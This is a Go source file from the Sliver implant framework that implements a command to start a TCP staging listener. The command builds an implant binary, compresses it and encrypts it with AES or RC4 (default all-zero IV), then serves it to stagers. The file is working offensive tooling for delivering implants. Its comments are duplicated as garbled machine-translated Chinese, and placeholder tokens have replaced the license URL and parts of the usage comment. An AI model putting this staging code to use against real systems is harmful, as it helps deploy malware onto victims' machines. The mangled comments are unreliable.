package jobs

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox
	Copyright (C) 2019 Bishop Fox

	This program is free software: you can redistribute it and/or modify
	This 程序是免费软件：您可以重新分发它 and/or 修改
	it under the terms of the GNU General Public License as published by
	它根据 GNU General Public License 发布的条款
	the Free Software Foundation, either version 3 of the License, or
	Free Software Foundation，License 的版本 3，或
	(at your option) any later version.
	（由您选择）稍后 version.

	This program is distributed in the hope that it will be useful,
	This 程序被分发，希望它有用，
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	但是WITHOUT ANY WARRANTY；甚至没有默示保证
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	MERCHANTABILITY 或 FITNESS FOR A PARTICULAR PURPOSE. See
	GNU General Public License for more details.
	GNU General Public License 更多 details.

	You should have received a copy of the GNU General Public License
	You 应已收到 GNU General Public License 的副本
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
	与此 program. If 不一起，请参见 <__PH0__
*/

import (
	"bytes"
	"compress/zlib"
	"context"
	"encoding/binary"
	"net/url"
	"strconv"
	"strings"

	"github.com/bishopfox/sliver/client/command/generate"
	"github.com/bishopfox/sliver/client/console"
	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/util"
	"github.com/bishopfox/sliver/util/encoders"
	"github.com/spf13/cobra"
)

// StageListenerCmd --url [tcp://ip:port | http://ip:port ] --profile name.
// StageListenerCmd __PH1__ [tcp://ip:port | __PH0__ ] __PH2__ name.
func StageListenerCmd(cmd *cobra.Command, con *console.SliverClient, args []string) {
	profileName, _ := cmd.Flags().GetString("profile")
	listenerURL, _ := cmd.Flags().GetString("url")
	aesEncryptKey, _ := cmd.Flags().GetString("aes-encrypt-key")
	aesEncryptIv, _ := cmd.Flags().GetString("aes-encrypt-iv")
	rc4EncryptKey, _ := cmd.Flags().GetString("rc4-encrypt-key")
	compressF, _ := cmd.Flags().GetString("compress")
	compress := strings.ToLower(compressF)

	if profileName == "" || listenerURL == "" {
		con.PrintErrorf("Missing required flags, see `help stage-listener` for more info\n")
		return
	}

	// parse listener url
	// 解析 listener url
	stagingURL, err := url.Parse(listenerURL)
	if err != nil {
		con.PrintErrorf("Listener-url format not supported")
		return
	}
	stagingPort, err := strconv.ParseUint(stagingURL.Port(), 10, 32)
	if err != nil {
		con.PrintErrorf("error parsing staging port: %v\n", err)
		return
	}

	profile := generate.GetImplantProfileByName(profileName, con)
	if profile == nil {
		con.PrintErrorf("Profile not found\n")
		return
	}

	if rc4EncryptKey != "" && aesEncryptKey != "" {
		con.PrintErrorf("Cannot use both RC4 and AES encryption\n")
		return
	}

	rc4Encrypt := false
	if rc4EncryptKey != "" {
		// RC4 keysize can be between 1 to 256 bytes
		// RC4 密钥大小可以介于 1 到 256 字节之间
		if len(rc4EncryptKey) < 1 || len(rc4EncryptKey) > 256 {
			con.PrintErrorf("Incorrect length of RC4 Key\n")
			return
		}
		rc4Encrypt = true
	}

	aesEncrypt := false
	if aesEncryptKey != "" {
		// check if aes encryption key is correct length
		// 检查 aes 加密密钥的长度是否正确
		if len(aesEncryptKey)%16 != 0 {
			con.PrintErrorf("Incorrect length of AES Key\n")
			return
		}

		// set default aes iv
		// 设置默认 aes iv
		if aesEncryptIv == "" {
			aesEncryptIv = "0000000000000000"
		}

		// check if aes iv is correct length
		// 检查 aes iv 的长度是否正确
		if len(aesEncryptIv)%16 != 0 {
			con.PrintErrorf("Incorrect length of AES IV\n")
			return
		}

		aesEncrypt = true
	}

	stage2, err := generate.GetSliverBinary(profile, con)
	if err != nil {
		con.PrintErrorf("%s\n", err)
		return
	}

	switch compress {
	case "zlib":
		// use zlib to compress the stage2
		// 使用zlib压缩stage2
		var compBuff bytes.Buffer
		zlibWriter := zlib.NewWriter(&compBuff)
		zlibWriter.Write(stage2)
		zlibWriter.Close()
		stage2 = compBuff.Bytes()
	case "gzip":
		stage2, _ = encoders.GzipBuf(stage2)
	case "deflate9":
		fallthrough
	case "deflate":
		stage2 = util.DeflateBuf(stage2)
	}

	if aesEncrypt {
		// PreludeEncrypt is vanilla AES, we typically only use it for interoperability with Prelude
		// PreludeEncrypt 是普通的 AES，我们通常仅将它用于与 Prelude 的互操作性
		// but it's also useful here as more advanced cipher modes are often difficult to implement in
		// 但它在这里也很有用，因为更高级的密码模式通常很难在
		// a stager.
		// 一个 stager.
		stage2 = util.PreludeEncrypt(stage2, []byte(aesEncryptKey), []byte(aesEncryptIv))
	}

	if rc4Encrypt {
		stage2 = util.RC4EncryptUnsafe(stage2, []byte(rc4EncryptKey))
	}

	switch stagingURL.Scheme {
	case "tcp":
		// Always prepend payload size for TCP stagers
		// Always 为 TCP 阶段预先考虑 payload 尺寸
		stage2 = prependPayloadSize(stage2)
		ctrl := make(chan bool)
		con.SpinUntil("Starting TCP staging listener...", ctrl)
		stageListener, err := con.Rpc.StartTCPStagerListener(context.Background(), &clientpb.StagerListenerReq{
			Protocol: clientpb.StageProtocol_TCP,
			Data:     stage2,
			Host:     stagingURL.Hostname(),
			Port:     uint32(stagingPort),
		})
		ctrl <- true
		<-ctrl
		if err != nil {
			con.PrintErrorf("Error starting TCP staging listener: %v\n", err)
			return
		}
		con.PrintInfof("Job %d (tcp) started\n", stageListener.GetJobID())

	default:
		con.PrintErrorf("Unsupported staging protocol: %s\n", stagingURL.Scheme)
		return
	}

	if aesEncrypt {
		con.PrintInfof("AES KEY: %v\n", aesEncryptKey)
		con.PrintInfof("AES IV: %v\n", aesEncryptIv)
	}

	if rc4Encrypt {
		con.PrintInfof("RC4 KEY: %v\n", rc4EncryptKey)
	}
}

func prependPayloadSize(payload []byte) []byte {
	payloadSize := uint32(len(payload))
	lenBuf := make([]byte, 4)
	binary.LittleEndian.PutUint32(lenBuf, payloadSize)
	return append(lenBuf, payload...)
}
